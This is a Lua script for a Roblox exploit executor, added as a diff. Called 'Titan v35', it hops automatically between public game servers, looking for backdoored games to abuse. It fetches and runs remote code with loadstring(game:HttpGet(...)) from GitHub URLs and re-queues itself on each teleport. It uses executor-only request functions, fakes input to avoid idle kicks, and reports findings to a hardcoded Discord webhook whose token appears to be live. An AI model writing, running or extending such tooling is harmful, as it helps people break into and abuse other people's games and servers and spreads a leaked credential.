@@ -1,0 +1,903 @@
+local success_text = "No backdoored"
+local script_url = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
+local self_url = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/egrofinal2"
+local webhook_url = "https://discord.com/api/webhooks/1487289258845802576/dXwi8nw8ptZZNEfWQiVLmBmNs0uSXGOXNRAR8cV_nDlDVJtSuDumUJlYB7_SEzVKiFqx"
+
+-- ════════════════════════════════════════════════
+--              SERVICES
+-- ════════════════════════════════════════════════
+local LogService        = game:GetService("LogService")
+local TeleportService   = game:GetService("TeleportService")
+local HttpService       = game:GetService("HttpService")
+local CoreGui           = game:GetService("CoreGui")
+local Players           = game:GetService("Players")
+local MarketplaceService= game:GetService("MarketplaceService")
+local Stats             = game:GetService("Stats")
+local TweenService      = game:GetService("TweenService")
+local RunService        = game:GetService("RunService")
+local UserInputService  = game:GetService("UserInputService")
+local LocalPlayer       = Players.LocalPlayer
+
+-- ════════════════════════════════════════════════
+--              STATE
+-- ════════════════════════════════════════════════
+local found_success   = false
+local scan_completed  = false
+local is_minimized    = false
+local databaseName    = "TitanDB_v35.json"
+local currentJobId    = tostring(game.JobId)
+local PlaceID         = game.PlaceId
+local gameName        = "INITIALIZING..."
+local startTime       = os.time()
+local actualHour      = os.date("!*t").hour
+
+local AllIDs          = {}
+local foundAnything   = ""
+local currentSort     = "Asc"
+local reset_stage     = 0
+local totalHops       = 0
+local totalScans      = 0
+local logLines        = {}
+local MAX_LOGS        = 80
+
+local function elapsed()
+    local s = os.time() - startTime
+    return string.format("%02d:%02d:%02d", math.floor(s/3600), math.floor(s/60)%60, s%60)
+end
+
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(tonumber(PlaceID))
+    gameName = info.Name
+end)
+
+-- ════════════════════════════════════════════════
+--              ANTI-IDLE
+-- ════════════════════════════════════════════════
+task.spawn(function()
+    local VU = game:GetService("VirtualUser")
+    LocalPlayer.Idled:Connect(function()
+        pcall(function()
+            VU:CaptureController()
+            VU:ClickButton2(Vector2.new(0, 0))
+        end)
+    end)
+end)
+
+-- ════════════════════════════════════════════════
+--              CLEANUP OLD GUI
+-- ════════════════════════════════════════════════
+pcall(function()
+    if CoreGui:FindFirstChild("TitanV35") then
+        CoreGui:FindFirstChild("TitanV35"):Destroy()
+    end
+end)
+
+-- ════════════════════════════════════════════════
+--              THEME
+-- ════════════════════════════════════════════════
+local C = {
+    bg          = Color3.fromRGB(4, 4, 6),
+    panel       = Color3.fromRGB(10, 10, 14),
+    panelAlt    = Color3.fromRGB(14, 14, 20),
+    accent      = Color3.fromRGB(0, 255, 140),
+    accentDim   = Color3.fromRGB(0, 160, 90),
+    accentDark  = Color3.fromRGB(0, 60, 35),
+    red         = Color3.fromRGB(255, 55, 55),
+    redDim      = Color3.fromRGB(160, 30, 30),
+    orange      = Color3.fromRGB(255, 165, 0),
+    blue        = Color3.fromRGB(40, 160, 255),
+    blueDim     = Color3.fromRGB(20, 80, 160),
+    yellow      = Color3.fromRGB(255, 215, 0),
+    white       = Color3.fromRGB(230, 230, 230),
+    muted       = Color3.fromRGB(100, 100, 110),
+    border      = Color3.fromRGB(30, 30, 40),
+    borderBright= Color3.fromRGB(0, 255, 140),
+    success     = Color3.fromRGB(0, 255, 140),
+    warning     = Color3.fromRGB(255, 165, 0),
+    danger      = Color3.fromRGB(255, 55, 55),
+    info        = Color3.fromRGB(40, 160, 255),
+}
+
+-- ════════════════════════════════════════════════
+--              ROOT GUI
+-- ════════════════════════════════════════════════
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TitanV35"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.DisplayOrder = 999
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = CoreGui
+
+-- ════════════════════════════════════════════════
+--              HELPERS
+-- ════════════════════════════════════════════════
+local function make(class, props, parent)
+    local obj = Instance.new(class)
+    for k, v in pairs(props) do
+        obj[k] = v
+    end
+    if parent then obj.Parent = parent end
+    return obj
+end
+
+local function corner(radius, parent)
+    return make("UICorner", {CornerRadius = UDim.new(0, radius)}, parent)
+end
+
+local function stroke(color, thickness, parent)
+    local s = make("UIStroke", {
+        Color = color,
+        Thickness = thickness,
+        ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    }, parent)
+    return s
+end
+
+local function padding(all, parent)
+    return make("UIPadding", {
+        PaddingTop    = UDim.new(0, all),
+        PaddingBottom = UDim.new(0, all),
+        PaddingLeft   = UDim.new(0, all),
+        PaddingRight  = UDim.new(0, all),
+    }, parent)
+end
+
+local function tween(obj, props, dur, style, dir)
+    local info = TweenInfo.new(dur or 0.25, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out)
+    TweenService:Create(obj, info, props):Play()
+end
+
+-- ════════════════════════════════════════════════
+--              MAIN FRAME
+-- ════════════════════════════════════════════════
+local W, H = 620, 700
+local mainFrame = make("Frame", {
+    Name = "MainFrame",
+    Size = UDim2.new(0, W, 0, H),
+    Position = UDim2.new(1, -(W+20), 1, -(H+20)),
+    BackgroundColor3 = C.bg,
+    BorderSizePixel = 0,
+    Active = true,
+    Draggable = true,
+    ClipsDescendants = true,
+}, screenGui)
+corner(16, mainFrame)
+local mainStroke = stroke(C.accent, 2, mainFrame)
+
+-- subtle scanline overlay
+local scanline = make("Frame", {
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundColor3 = Color3.fromRGB(0, 0, 0),
+    BackgroundTransparency = 0.97,
+    BorderSizePixel = 0,
+    ZIndex = 10,
+}, mainFrame)
+
+-- ════════════════════════════════════════════════
+--              HEADER
+-- ════════════════════════════════════════════════
+local header = make("Frame", {
+    Name = "Header",
+    Size = UDim2.new(1, 0, 0, 70),
+    BackgroundColor3 = C.panel,
+    BorderSizePixel = 0,
+}, mainFrame)
+corner(16, header)
+
+-- bottom fill for header corners
+make("Frame", {
+    Size = UDim2.new(1, 0, 0, 16),
+    Position = UDim2.new(0, 0, 1, -16),
+    BackgroundColor3 = C.panel,
+    BorderSizePixel = 0,
+}, header)
+
+-- accent left bar
+make("Frame", {
+    Size = UDim2.new(0, 4, 1, 0),
+    BackgroundColor3 = C.accent,
+    BorderSizePixel = 0,
+}, header)
+
+local titleLabel = make("TextLabel", {
+    Size = UDim2.new(0, 300, 1, 0),
+    Position = UDim2.new(0, 20, 0, 0),
+    Text = "TITAN  v35.0",
+    TextColor3 = C.accent,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    TextSize = 20,
+    TextXAlignment = Enum.TextXAlignment.Left,
+})
+titleLabel.Parent = header
+
+local subLabel = make("TextLabel", {
+    Size = UDim2.new(0, 300, 0, 18),
+    Position = UDim2.new(0, 20, 0, 42),
+    Text = "SERVER HOP SCANNER",
+    TextColor3 = C.muted,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamSemibold,
+    TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Left,
+})
+subLabel.Parent = header
+
+-- uptime label top right
+local uptimeLabel = make("TextLabel", {
+    Size = UDim2.new(0, 120, 0, 18),
+    Position = UDim2.new(1, -180, 0, 14),
+    Text = "UPTIME  00:00:00",
+    TextColor3 = C.muted,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.Code,
+    TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Right,
+})
+uptimeLabel.Parent = header
+
+-- minimize button
+local minBtn = make("TextButton", {
+    Size = UDim2.new(0, 36, 0, 36),
+    Position = UDim2.new(1, -50, 0.5, -18),
+    BackgroundColor3 = C.panelAlt,
+    Text = "−",
+    TextColor3 = C.white,
+    Font = Enum.Font.GothamBold,
+    TextSize = 18,
+    BorderSizePixel = 0,
+})
+minBtn.Parent = header
+corner(8, minBtn)
+stroke(C.border, 1, minBtn)
+
+-- ════════════════════════════════════════════════
+--              CONTENT AREA
+-- ════════════════════════════════════════════════
+local content = make("Frame", {
+    Name = "Content",
+    Size = UDim2.new(1, 0, 1, -70),
+    Position = UDim2.new(0, 0, 0, 70),
+    BackgroundTransparency = 1,
+})
+content.Parent = mainFrame
+padding(14, content)
+
+local layout = make("UIListLayout", {
+    Padding = UDim.new(0, 10),
+    FillDirection = Enum.FillDirection.Vertical,
+    SortOrder = Enum.SortOrder.LayoutOrder,
+}, content)
+
+-- ════════════════════════════════════════════════
+--              STATUS BAR
+-- ════════════════════════════════════════════════
+local statusBar = make("Frame", {
+    Size = UDim2.new(1, 0, 0, 38),
+    BackgroundColor3 = C.accentDark,
+    BorderSizePixel = 0,
+    LayoutOrder = 1,
+})
+statusBar.Parent = content
+corner(8, statusBar)
+stroke(C.accent, 1, statusBar)
+
+local statusDot = make("Frame", {
+    Size = UDim2.new(0, 10, 0, 10),
+    Position = UDim2.new(0, 14, 0.5, -5),
+    BackgroundColor3 = C.accent,
+    BorderSizePixel = 0,
+})
+statusDot.Parent = statusBar
+corner(5, statusDot)
+
+local statusLabel = make("TextLabel", {
+    Size = UDim2.new(1, -120, 1, 0),
+    Position = UDim2.new(0, 32, 0, 0),
+    Text = "STATUS  ·  INITIALIZING",
+    TextColor3 = C.accent,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    TextSize = 12,
+    TextXAlignment = Enum.TextXAlignment.Left,
+})
+statusLabel.Parent = statusBar
+
+local scanTimerLabel = make("TextLabel", {
+    Size = UDim2.new(0, 100, 1, 0),
+    Position = UDim2.new(1, -110, 0, 0),
+    Text = "",
+    TextColor3 = C.accentDim,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.Code,
+    TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Right,
+})
+scanTimerLabel.Parent = statusBar
+
+-- pulse animation for dot
+task.spawn(function()
+    while true do
+        tween(statusDot, {BackgroundTransparency = 0.6}, 0.6)
+        task.wait(0.6)
+        tween(statusDot, {BackgroundTransparency = 0}, 0.6)
+        task.wait(0.6)
+    end
+end)
+
+-- ════════════════════════════════════════════════
+--              TOP STATS GRID (2x3)
+-- ════════════════════════════════════════════════
+local statsGrid = make("Frame", {
+    Size = UDim2.new(1, 0, 0, 130),
+    BackgroundTransparency = 1,
+    LayoutOrder = 2,
+})
+statsGrid.Parent = content
+
+make("UIGridLayout", {
+    CellSize = UDim2.new(0.333, -5, 0, 58),
+    CellPaddingH = UDim.new(0, 8),
+    CellPaddingV = UDim.new(0, 8),
+    FillDirectionMaxCells = 3,
+    SortOrder = Enum.SortOrder.LayoutOrder,
+}, statsGrid)
+
+local statCards = {}
+local statDefs = {
+    { key = "game",     label = "EXPERIENCE",   value = string.sub(gameName, 1, 16), color = C.white,   icon = "🎮" },
+    { key = "ping",     label = "PING",          value = "0 ms",                     color = C.blue,    icon = "📡" },
+    { key = "hops",     label = "HOPS",          value = "0",                        color = C.accent,  icon = "⚡" },
+    { key = "db",       label = "DATABASE",      value = "0 servers",                color = C.muted,   icon = "🗄" },
+    { key = "sort",     label = "SORT MODE",     value = "ASCENDING",                color = C.yellow,  icon = "↕" },
+    { key = "scans",    label = "SCANS",         value = "0",                        color = C.orange,  icon = "🔍" },
+}
+
+for i, def in ipairs(statDefs) do
+    local card = make("Frame", {
+        BackgroundColor3 = C.panel,
+        BorderSizePixel = 0,
+        LayoutOrder = i,
+    })
+    card.Parent = statsGrid
+    corner(10, card)
+    stroke(C.border, 1, card)
+
+    make("TextLabel", {
+        Size = UDim2.new(1, 0, 0, 14),
+        Position = UDim2.new(0, 10, 0, 8),
+        Text = def.icon .. "  " .. def.label,
+        TextColor3 = C.muted,
+        BackgroundTransparency = 1,
+        Font = Enum.Font.GothamSemibold,
+        TextSize = 9,
+        TextXAlignment = Enum.TextXAlignment.Left,
+    }).Parent = card
+
+    local valLabel = make("TextLabel", {
+        Size = UDim2.new(1, -10, 0, 22),
+        Position = UDim2.new(0, 10, 0, 26),
+        Text = def.value,
+        TextColor3 = def.color,
+        BackgroundTransparency = 1,
+        Font = Enum.Font.GothamBold,
+        TextSize = 13,
+        TextXAlignment = Enum.TextXAlignment.Left,
+    })
+    valLabel.Parent = card
+    statCards[def.key] = valLabel
+end
+
+-- ════════════════════════════════════════════════
+--              PROGRESS BAR
+-- ════════════════════════════════════════════════
+local progressOuter = make("Frame", {
+    Size = UDim2.new(1, 0, 0, 22),
+    BackgroundColor3 = C.panelAlt,
+    BorderSizePixel = 0,
+    LayoutOrder = 3,
+})
+progressOuter.Parent = content
+corner(6, progressOuter)
+stroke(C.border, 1, progressOuter)
+
+local progressFill = make("Frame", {
+    Size = UDim2.new(0, 0, 1, 0),
+    BackgroundColor3 = C.accent,
+    BorderSizePixel = 0,
+})
+progressFill.Parent = progressOuter
+corner(6, progressFill)
+
+local progressLabel = make("TextLabel", {
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundTransparency = 1,
+    Text = "SCAN PROGRESS  0 / 40s",
+    TextColor3 = C.bg,
+    Font = Enum.Font.GothamBold,
+    TextSize = 10,
+})
+progressLabel.Parent = progressOuter
+
+-- ════════════════════════════════════════════════
+--              LOG PANEL
+-- ════════════════════════════════════════════════
+local logPanel = make("Frame", {
+    Size = UDim2.new(1, 0, 0, 220),
+    BackgroundColor3 = C.panel,
+    BorderSizePixel = 0,
+    LayoutOrder = 4,
+})
+logPanel.Parent = content
+corner(10, logPanel)
+stroke(C.border, 1, logPanel)
+
+-- log header
+local logHeader = make("Frame", {
+    Size = UDim2.new(1, 0, 0, 28),
+    BackgroundColor3 = C.panelAlt,
+    BorderSizePixel = 0,
+})
+logHeader.Parent = logPanel
+corner(10, logHeader)
+
+make("Frame", {
+    Size = UDim2.new(1, 0, 0, 10),
+    Position = UDim2.new(0, 0, 1, -10),
+    BackgroundColor3 = C.panelAlt,
+    BorderSizePixel = 0,
+}).Parent = logHeader
+
+make("TextLabel", {
+    Size = UDim2.new(1, -20, 1, 0),
+    Position = UDim2.new(0, 14, 0, 0),
+    Text = "▸  ACTIVITY LOG",
+    TextColor3 = C.muted,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Left,
+}).Parent = logHeader
+
+local logCountLabel = make("TextLabel", {
+    Size = UDim2.new(0, 80, 1, 0),
+    Position = UDim2.new(1, -90, 0, 0),
+    Text = "0 entries",
+    TextColor3 = C.muted,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.Code,
+    TextSize = 9,
+    TextXAlignment = Enum.TextXAlignment.Right,
+})
+logCountLabel.Parent = logHeader
+
+local logScroll = make("ScrollingFrame", {
+    Size = UDim2.new(1, 0, 1, -28),
+    Position = UDim2.new(0, 0, 0, 28),
+    BackgroundTransparency = 1,
+    BorderSizePixel = 0,
+    ScrollBarThickness = 3,
+    ScrollBarImageColor3 = C.accentDim,
+    CanvasSize = UDim2.new(0, 0, 0, 0),
+})
+logScroll.Parent = logPanel
+padding(6, logScroll)
+
+local logLayout = make("UIListLayout", {
+    Padding = UDim.new(0, 2),
+    SortOrder = Enum.SortOrder.LayoutOrder,
+}, logScroll)
+
+-- ════════════════════════════════════════════════
+--              BOTTOM BUTTONS
+-- ════════════════════════════════════════════════
+local btnRow = make("Frame", {
+    Size = UDim2.new(1, 0, 0, 42),
+    BackgroundTransparency = 1,
+    LayoutOrder = 5,
+})
+btnRow.Parent = content
+
+make("UIListLayout", {
+    Padding = UDim.new(0, 8),
+    FillDirection = Enum.FillDirection.Horizontal,
+    SortOrder = Enum.SortOrder.LayoutOrder,
+}, btnRow)
+
+local function makeBtn(text, color, order)
+    local btn = make("TextButton", {
+        Size = UDim2.new(0.5, -4, 1, 0),
+        BackgroundColor3 = color,
+        Text = text,
+        TextColor3 = C.white,
+        Font = Enum.Font.GothamBold,
+        TextSize = 11,
+        BorderSizePixel = 0,
+        LayoutOrder = order,
+    })
+    btn.Parent = btnRow
+    corner(8, btn)
+    return btn
+end
+
+local resetBtn  = makeBtn("⚠  WIPE DATABASE", C.redDim, 1)
+local forceHop  = makeBtn("⚡  FORCE HOP NOW", C.blueDim, 2)
+
+-- ════════════════════════════════════════════════
+--              FOOTER
+-- ════════════════════════════════════════════════
+local footer = make("Frame", {
+    Size = UDim2.new(1, 0, 0, 24),
+    BackgroundTransparency = 1,
+    LayoutOrder = 6,
+})
+footer.Parent = content
+
+local footerLabel = make("TextLabel", {
+    Size = UDim2.new(1, 0, 1, 0),
+    Text = "TITAN v35  ·  " .. string.sub(tostring(game.JobId), 1, 18) .. "...",
+    TextColor3 = C.muted,
+    BackgroundTransparency = 1,
+    Font = Enum.Font.Code,
+    TextSize = 9,
+    TextXAlignment = Enum.TextXAlignment.Center,
+})
+footerLabel.Parent = footer
+
+-- ════════════════════════════════════════════════
+--              LOG FUNCTION
+-- ════════════════════════════════════════════════
+local logEntry = 0
+local function AddLog(msg, col)
+    logEntry = logEntry + 1
+    table.insert(logLines, {msg = msg, col = col or C.white, t = os.date("%X")})
+    if #logLines > MAX_LOGS then table.remove(logLines, 1) end
+
+    -- trim old labels
+    local children = logScroll:GetChildren()
+    local count = 0
+    for _, c in ipairs(children) do
+        if c:IsA("TextLabel") then count = count + 1 end
+    end
+    if count > MAX_LOGS then
+        for _, c in ipairs(logScroll:GetChildren()) do
+            if c:IsA("TextLabel") then
+                c:Destroy()
+                break
+            end
+        end
+    end
+
+    local l = make("TextLabel", {
+        Size = UDim2.new(1, 0, 0, 16),
+        BackgroundTransparency = 1,
+        Text = "  " .. os.date("%X") .. "  " .. msg,
+        TextColor3 = col or C.white,
+        Font = Enum.Font.Code,
+        TextSize = 10,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        LayoutOrder = logEntry,
+    })
+    l.Parent = logScroll
+    logScroll.CanvasSize = UDim2.new(0, 0, 0, logLayout.AbsoluteContentSize.Y + 12)
+    logScroll.CanvasPosition = Vector2.new(0, logLayout.AbsoluteContentSize.Y)
+    logCountLabel.Text = #logLines .. " entries"
+end
+
+-- ════════════════════════════════════════════════
+--              STAT UPDATER
+-- ════════════════════════════════════════════════
+local function setStatus(text, col)
+    statusLabel.Text = "STATUS  ·  " .. text
+    statusLabel.TextColor3 = col or C.accent
+    statusDot.BackgroundColor3 = col or C.accent
+    mainStroke.Color = col or C.accent
+end
+
+local function updateCard(key, value)
+    if statCards[key] then
+        statCards[key].Text = tostring(value)
+    end
+end
+
+-- ════════════════════════════════════════════════
+--              DATABASE
+-- ════════════════════════════════════════════════
+local function SaveToDB()
+    local ok, err = pcall(function()
+        writefile(databaseName, HttpService:JSONEncode(AllIDs))
+    end)
+    updateCard("db", #AllIDs .. " servers")
+    if not ok then AddLog("DB WRITE FAIL: " .. tostring(err), C.red) end
+end
+
+local function LoadDB()
+    local ok, result = pcall(function()
+        return HttpService:JSONDecode(readfile(databaseName))
+    end)
+    if ok and type(result) == "table" then
+        if result[1] ~= actualHour then
+            AllIDs = {actualHour}
+            SaveToDB()
+            AddLog("NEW SESSION — DB RESET", C.yellow)
+        else
+            AllIDs = result
+            AddLog("DB LOADED: " .. #AllIDs .. " servers", C.accent)
+        end
+    else
+        AllIDs = {actualHour}
+        SaveToDB()
+        AddLog("DB CREATED FRESH", C.muted)
+    end
+    updateCard("db", #AllIDs .. " servers")
+end
+
+-- ════════════════════════════════════════════════
+--              MINIMIZE
+-- ════════════════════════════════════════════════
+minBtn.MouseButton1Click:Connect(function()
+    is_minimized = not is_minimized
+    if is_minimized then
+        tween(mainFrame, {Size = UDim2.new(0, W, 0, 70)}, 0.3)
+        content.Visible = false
+        minBtn.Text = "+"
+    else
+        content.Visible = true
+        tween(mainFrame, {Size = UDim2.new(0, W, 0, H)}, 0.3)
+        minBtn.Text = "−"
+    end
+end)
+
+-- hover effects
+minBtn.MouseEnter:Connect(function() tween(minBtn, {BackgroundColor3 = C.border}, 0.15) end)
+minBtn.MouseLeave:Connect(function() tween(minBtn, {BackgroundColor3 = C.panelAlt}, 0.15) end)
+resetBtn.MouseEnter:Connect(function() tween(resetBtn, {BackgroundColor3 = C.red}, 0.15) end)
+resetBtn.MouseLeave:Connect(function() tween(resetBtn, {BackgroundColor3 = C.redDim}, 0.15) end)
+forceHop.MouseEnter:Connect(function() tween(forceHop, {BackgroundColor3 = C.blue}, 0.15) end)
+forceHop.MouseLeave:Connect(function() tween(forceHop, {BackgroundColor3 = C.blueDim}, 0.15) end)
+
+-- ════════════════════════════════════════════════
+--              RESET BUTTON
+-- ════════════════════════════════════════════════
+resetBtn.MouseButton1Click:Connect(function()
+    if reset_stage == 0 then
+        reset_stage = 1
+        resetBtn.Text = "⚠  CONFIRM WIPE?"
+        tween(resetBtn, {BackgroundColor3 = C.orange}, 0.2)
+        task.delay(4, function()
+            if reset_stage == 1 then
+                reset_stage = 0
+                resetBtn.Text = "⚠  WIPE DATABASE"
+                tween(resetBtn, {BackgroundColor3 = C.redDim}, 0.2)
+            end
+        end)
+    else
+        reset_stage = 0
+        AllIDs = {actualHour}
+        SaveToDB()
+        resetBtn.Text = "✓  WIPED!"
+        tween(resetBtn, {BackgroundColor3 = C.accentDark}, 0.2)
+        AddLog("DATABASE PURGED BY USER", C.yellow)
+        task.wait(2)
+        resetBtn.Text = "⚠  WIPE DATABASE"
+        tween(resetBtn, {BackgroundColor3 = C.redDim}, 0.2)
+    end
+end)
+
+-- ════════════════════════════════════════════════
+--              SERVER HOP
+-- ════════════════════════════════════════════════
+local hopping = false
+local function doHop()
+    if hopping then return end
+    hopping = true
+    setStatus("QUEUING & HOPPING...", C.blue)
+    AddLog("INITIATING SERVER HOP", C.blue)
+
+    local q = (syn and syn.queue_on_teleport)
+           or (queue_on_teleport)
+           or (fluxus and fluxus.queue_on_teleport)
+
+    if q then
+        local ok, src = pcall(function() return game:HttpGet(self_url) end)
+        if ok and src and #src > 10 then
+            pcall(function() q(src) end)
+            AddLog("QUEUED SELF-SCRIPT OK", C.accent)
+        else
+            AddLog("SELF-FETCH FAILED — QUEUE SKIPPED", C.red)
+        end
+    else
+        AddLog("NO QUEUE FUNC FOUND", C.red)
+    end
+
+    local api = "https://games.roblox.com/v1/games/" .. PlaceID
+             .. "/servers/Public?sortOrder=" .. currentSort .. "&limit=100"
+    if foundAnything ~= "" then api = api .. "&cursor=" .. foundAnything end
+
+    local ok2, resp = pcall(function() return game:HttpGet(api) end)
+    if not ok2 or not resp then
+        AddLog("API FETCH FAILED", C.red)
+        hopping = false
+        return
+    end
+
+    local site = pcall(function() return HttpService:JSONDecode(resp) end) and HttpService:JSONDecode(resp)
+    if not site or not site.data or #site.data == 0 then
+        AddLog("NO SERVER DATA RETURNED", C.red)
+        foundAnything = ""
+        currentSort = (currentSort == "Asc" and "Desc" or "Asc")
+        updateCard("sort", currentSort == "Asc" and "ASCENDING" or "DESCENDING")
+        hopping = false
+        return
+    end
+
+    if site.nextPageCursor and site.nextPageCursor ~= "null" then
+        foundAnything = site.nextPageCursor
+    else
+        foundAnything = ""
+        currentSort = (currentSort == "Asc" and "Desc" or "Asc")
+        updateCard("sort", currentSort == "Asc" and "ASCENDING" or "DESCENDING")
+    end
+
+    for _, v in pairs(site.data) do
+        local ID = tostring(v.id)
+        local Possible = true
+
+        if tonumber(v.maxPlayers) > tonumber(v.playing) and ID ~= currentJobId then
+            for i, existing in ipairs(AllIDs) do
+                if i > 1 and ID == tostring(existing) then
+                    Possible = false
+                    break
+                end
+            end
+
+            if Possible then
+                table.insert(AllIDs, ID)
+                SaveToDB()
+                totalHops = totalHops + 1
+                updateCard("hops", totalHops)
+                AddLog("HOPPING → " .. v.playing .. "/" .. v.maxPlayers .. " PLAYERS", C.accent)
+                setStatus("TELEPORTING...", C.accent)
+                pcall(function()
+                    TeleportService:TeleportToPlaceInstance(PlaceID, ID, LocalPlayer)
+                end)
+                task.wait(10)
+                break
+            else
+                AddLog("SKIP (VISITED): " .. string.sub(ID, 1, 12), C.muted)
+            end
+        end
+    end
+
+    hopping = false
+end
+
+-- force hop button
+forceHop.MouseButton1Click:Connect(function()
+    task.spawn(doHop)
+end)
+
+-- ════════════════════════════════════════════════
+--              PING UPDATER
+-- ════════════════════════════════════════════════
+task.spawn(function()
+    while task.wait(1) do
+        pcall(function()
+            local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+            local col = ping < 80 and C.accent or ping < 150 and C.yellow or C.red
+            statCards["ping"].Text = ping .. " ms"
+            statCards["ping"].TextColor3 = col
+        end)
+        uptimeLabel.Text = "UPTIME  " .. elapsed()
+    end
+end)
+
+-- ════════════════════════════════════════════════
+--              LOG LISTENER + EXECUTE
+-- ════════════════════════════════════════════════
+LoadDB()
+updateCard("game", string.sub(gameName, 1, 16))
+
+setStatus("SCANNING...", C.yellow)
+AddLog("TITAN v35 STARTED", C.accent)
+AddLog("TARGET: " .. success_text, C.muted)
+AddLog("EXECUTING SCRIPT...", C.white)
+totalScans = totalScans + 1
+updateCard("scans", totalScans)
+
+local obs = LogService.MessageOut:Connect(function(m)
+    local low = m:lower()
+    if string.find(low, success_text:lower(), 1, true) then
+        found_success = true
+        AddLog("✓ TRIGGER DETECTED: " .. string.sub(m, 1, 40), C.accent)
+        setStatus("TRIGGERED!", C.accent)
+    end
+    if string.find(low, "complete", 1, true) or string.find(low, "finished", 1, true) then
+        scan_completed = true
+    end
+end)
+
+pcall(function() loadstring(game:HttpGet(script_url))() end)
+
+-- ════════════════════════════════════════════════
+--              SCAN TIMER LOOP
+-- ════════════════════════════════════════════════
+local waitA = 0
+local MAX_WAIT = 40
+while waitA < MAX_WAIT do
+    if found_success then break end
+    if scan_completed and waitA > 5 then break end
+    waitA = waitA + 1
+    local pct = waitA / MAX_WAIT
+    tween(progressFill, {Size = UDim2.new(pct, 0, 1, 0)}, 0.9)
+    progressLabel.Text = "SCAN PROGRESS  " .. waitA .. " / " .. MAX_WAIT .. "s"
+    scanTimerLabel.Text = (MAX_WAIT - waitA) .. "s LEFT"
+    task.wait(1)
+end
+obs:Disconnect()
+tween(progressFill, {Size = UDim2.new(1, 0, 1, 0)}, 0.3)
+progressLabel.Text = "SCAN COMPLETE"
+scanTimerLabel.Text = ""
+
+-- ════════════════════════════════════════════════
+--              RESULT
+-- ════════════════════════════════════════════════
+if found_success then
+    setStatus("TRIGGER FOUND — HOPPING LOOP", C.accent)
+    AddLog("ENTERING HOP LOOP", C.accent)
+
+    -- webhook
+    if webhook_url ~= "" then
+        pcall(function()
+            local payload = HttpService:JSONEncode({
+                username = "Titan v35",
+                embeds = {{
+                    title = "✅ TRIGGER DETECTED",
+                    color = 65430,
+                    fields = {
+                        {name = "Game", value = gameName, inline = true},
+                        {name = "Hops", value = tostring(totalHops), inline = true},
+                    }
+                }}
+            })
+            local req = (syn and syn.request) or (http and http.request) or http_request
+            req({
+                Url = webhook_url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+        end)
+    end
+
+    while task.wait(1) do
+        pcall(doHop)
+    end
+else
+    setStatus("NOT FOUND — STAYING", C.red)
+    mainStroke.Color = C.red
+    statusDot.BackgroundColor3 = C.red
+    AddLog("TRIGGER NOT FOUND. STAYING.", C.red)
+    AddLog("WAITING FOR NEXT MANUAL HOP", C.muted)
+
+    if webhook_url ~= "" then
+        pcall(function()
+            local payload = HttpService:JSONEncode({
+                username = "Titan v35",
+                embeds = {{
+                    title = "❌ BACKDOOR NOT FOUND",
+                    color = 16711680,
+                    fields = {{name = "Game", value = gameName}}
+                }}
+            })
+            local req = (syn and syn.request) or (http and http.request) or http_request
+            req({
+                Url = webhook_url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+        end)
+    end
+end
